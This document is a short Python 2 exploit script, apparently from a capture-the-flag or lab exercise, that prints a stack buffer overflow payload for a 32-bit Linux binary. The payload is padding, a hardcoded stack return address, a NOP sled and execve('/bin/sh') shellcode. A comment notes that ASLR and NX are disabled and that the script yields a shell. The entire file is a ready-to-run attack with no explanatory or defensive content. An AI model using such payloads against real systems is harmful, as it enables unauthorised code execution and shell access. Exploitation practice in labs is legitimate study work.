#! /usr/bin/python

import sys
import struct

if sys.byteorder == 'little':
	Q = lambda x: struct.pack("<I", x)
elif sys.byteorder == 'big':
	Q = lambda x: struct.pack(">I", x)

# because ASLR and NX-shit has disabled plus this binary are not full RELRO,
# easily, we can inject our shellcode in the particular location on the stack,
# and finally... got a shell :)
shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3" + \
	    "\x50\x50\x53\x89\xe1\x8d\x54\x24\x08\xb0\x0b\xcd\x80"

esp = Q(0xbfffee10)

p =  "\x41"*(0x80 + 12)
p += esp
p += "\x90"*(500)
p += shellcode

print p
